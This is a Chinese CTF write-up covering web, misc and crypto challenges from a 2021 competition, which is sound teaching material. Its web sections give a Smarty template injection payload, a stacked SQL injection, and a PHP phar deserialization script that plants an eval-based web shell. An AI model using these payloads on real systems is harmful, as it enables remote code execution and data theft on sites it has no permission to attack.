---
title: 第一届四叶草牛年CTF
categories: 赛题wp
---
![](https://img-blog.csdnimg.cn/20210301023339685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

<!--more-->
---
## web GET
- 考点：smarty模块注入

![](https://img-blog.csdnimg.cn/20210301013616644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
是smarty模板注入  [smarty模块注入](https://blog.csdn.net/qq_45521281/article/details/107556915)

```
  payload：?flag={if passthru(“tac fl*”)}{/if}

  passthru — 执行外部程序并且显示原始输出
```

---
## web StAck3d 1nj3c
- 考点：堆叠注入+sql _mode

 测试堆叠注入成功

![](https://img-blog.csdnimg.cn/20210301014139683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210301014151593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
走到这一步 发现 from被 ban了 走不下去了

wp：

 [SUCTF 2019]EasySQL 原题

赛题原理：
 >select $_GET['query'] || flag from flag


>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接, 但在mysql 缺省`不支持`。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能

```
  payload: query=1;set sql_mode=PIPES_AS_CONCAT;select 1
 ```

---
## web file manager
- 考点：phar 反序列化+伪协议

[phar反序列化](https://blog.csdn.net/qq_42181428/article/details/100995404)


题目有四个功能，分别是文件上传，创建文件，删除文件和列举目录

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210301015012338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
经过一番尝试，发现文件上传只能上传图片，但是看到删除文件的功能，就想到`unlink函数`可以触发phar，并且code.html给了类

那就生成phar改一下名字，再用phar伪协议触发即可

由于文件上传的代码不允许php存在上传文件中，就用<?=绕过即可


```bash
<?php
class game
{
    public $file_name="shell.php";
    public $content = "<?=eval($_POST['cmd']);?>";

}
$a = new game();

$phar = new Phar('test.phar',0,'test.phar');
$phar->startBuffering();
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');


$phar->setMetadata($a);
$phar->addFromString('text.txt','test');
$phar->stopBuffering();

```
>unlink() 函数删除文件。 若成功，则返回 true，失败则返回 false。

用burp发包upload以后
在http://739c3f33.yunyansec.com/index.php?m=unlink

post数据file=phar://./sandbox/5.jpg

之后访问http://739c3f33.yunyansec.com/5.php即可获得flag

---
## web website(x)
- 考点 ssrf中使用302跳转进行bypass

---
## Misc Lsp们冲啊
- 考点：crc32+lsb隐写


![](https://img-blog.csdnimg.cn/20210301015655230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
什么都没有 考虑crc碰撞  每个文件 3 字节

```bash
import binascii
import string
strings=string.printable
crcs=[0x07d3f356, 0xd878a99d, 0x4e25a843, 0x6e16e99d, 0x549248b9]
pwd=['']*5
for a in strings:
    for b in strings:
        for c in strings:
            crc=binascii.crc32((a+b+c).encode())
            for i in range(5):
                if(crc & 0xFFFFFFFF) ==crcs[i]:
                    pwd[i]= a+b+c
for i in pwd:
    print(i,end='')

```
得到密码：Zz!9(18Hb9e#>h8

![](https://img-blog.csdnimg.cn/20210301015803886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## Misc Here are three packages！
- 考点：压缩包爆破+crc碰撞+词频分析+宽字符隐写+snow隐写

![](https://img-blog.csdnimg.cn/20210301015912314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
搜索跟月份相关但又不是某种加密 直接爆破

得 密码 956931011

![](https://img-blog.csdnimg.cn/20210301015946625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
字频分析得：

```bash
import sys

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+- ={}[]"
# filename = input('请输入目标文本:')

data = input()

result = {d:0 for d in alphabet}#//生成字典


def sort_by_value(d):
    items = d.items()
    backitems = [[v[1],v[0]] for v in items]
    backitems.sort(reverse=True)
    print(backitems,'\n\n') #//按出现次数从大到小输出对应次数和字符
    return [ backitems[i][1] for i in range(0,len(backitems))]#//按出现次数从大到小返回字符

for d in data:
    for alpha in alphabet:
        if d == alpha:
            result[alpha] = result[alpha] + 1 #//字符出现一次加一

print(''.join(sort_by_value(result))) #//连接成字符串

```

```bash
dic=dict() 
d={} 
s=set() 
s='fk{hbeawfikn .l;jsg[op{ewhtgfkjbarASPUJF923U5 RJO9key3Y2905-RYHWEIOT{YU2390IETGHBF{}FUJse{ikogh{bwieukeyyjvgb"akkeysyh{k;yhweaukyeyoitgbsdakey{jg89gS}OYHqw8{}9ifgbDFHIOGHJ{fbiosGFBJKSgbfuiyoEGJWEbfv}yek' 
d=dict() 
for x in s:    
    if x not in d.keys():        
        d[x]=1    
    else:        
        d[x]=d[x]+1 
print(sorted(d.items(), key = lambda i:i[1],reverse=True))

```

调试得到  key{bgfi9JaFHhosw}，解第三个压缩包

Hint3 为宽字符隐写：

[宽字符隐写在线加解密](https://330k.github.io/misc_tools/unicode_steganography.html)

![](https://img-blog.csdnimg.cn/20210301020442484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
得到密码  Zero-Width

Snow隐写：

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030102085038.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

>SNOW.EXE -p Zero-Width -C c:\Users\cys\Desktop\22.txt

![](https://img-blog.csdnimg.cn/20210301020916188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
flag{e3e1cd2fa790e0b35795ef3b2ab3992b}

---
## Misc 牛气冲天
- 考点：伪加密+png高度

伪加密检测 

>java -jar ZipCenOp-伪加密.jar r c:\Users\cys\Desktop\牛气冲天-SGXL7luQ.zip


![](https://img-blog.csdnimg.cn/20210301021049593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

Steghide隐写：
>steghide extract -sf c:\Users\cys\Desktop\cattle.jpg

需要密码 猜测文件名为密码 解得隐写：

![](https://img-blog.csdnimg.cn/20210301021126353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
解压缩包得到png  修改高度得到flag

---
## Misc 在屋子上的小姐姐
![](https://img-blog.csdnimg.cn/20210301021355260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
010打开发现尾部有压缩包

![](https://img-blog.csdnimg.cn/20210301021410132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210301021421490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
结合图片 推测日期为flag


---
## Crypto  抚琴的rsa
[RSA已知 p q e c 求明文](https://www.cryptool.org/en/cto/highlights/rsa-step-by-step)

![](https://img-blog.csdnimg.cn/20210301021837606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
脚本：

```bash
import gmpy2
from Crypto.Util.number import *
from binascii import a2b_hex,b2a_hex

flag = "*****************"

c = xxxxx
p = xxxxx
q = xxxxx
e = xxxxx
n=p*q
phi=(p-1)*(q-1)

d=int(gmpy2.invert(e,phi))
m=pow(c,d,n)

print(m)

```

---
## Crypto 凯撒大帝用MD5三步跨栏套娃
Base64 base32 base16 得到32位密码 凯撒三位 md5解密

---
## Crypto 另类RSA
![](https://img-blog.csdnimg.cn/20210301022244708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
先分解n 得到p q  [RSA分解n](http://factordb.com/)

rsatools 得到 d

![](https://img-blog.csdnimg.cn/20210301022318825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## Crypto hello cpy

![](https://img-blog.csdnimg.cn/20210301022631813.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

![](https://img-blog.csdnimg.cn/20210301022642355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

